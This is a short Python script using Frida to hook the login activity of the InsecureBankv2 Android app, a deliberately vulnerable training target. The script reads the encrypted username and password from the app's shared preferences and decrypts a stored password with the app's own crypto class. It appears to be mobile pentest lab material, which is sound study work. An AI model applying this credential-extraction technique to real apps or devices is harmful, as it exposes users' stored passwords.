import frida, sys

def on_message(message, data):
	if message['type'] == 'send':
		print("[*] {0}".format(message['payload']))
	else:
		print(message)

code = """
Java.perform(function () {
	var main = Java.use('com.android.insecurebankv2.LoginActivity');
	var cc = Java.use('com.android.insecurebankv2.CryptoClass');
	main.fillData.implementation = function () {
	console.log('Function fillData called');
	var spvar = this.getSharedPreferences("mySharedPreferences", 0);

	console.log("Username Encrypted: ");
	console.log(spvar.getString("EncryptedUsername", null));
	console.log("Password Encrypted :");
	console.log(spvar.getString("superSecurePassword", null));
	
	//Decrypt the password
	console.log("Decrypted Password:");
	var ccv = cc.$new();
	console.log(ccv.aesDeccryptedString('DTrW2VXjSoFdg0e61fHxJg=='));
	};

	

});
"""

process = frida.get_usb_device().attach('com.android.insecurebankv2')
script = process.create_script(code)
script.on('message', on_message)
script.load()
sys.stdin.read()
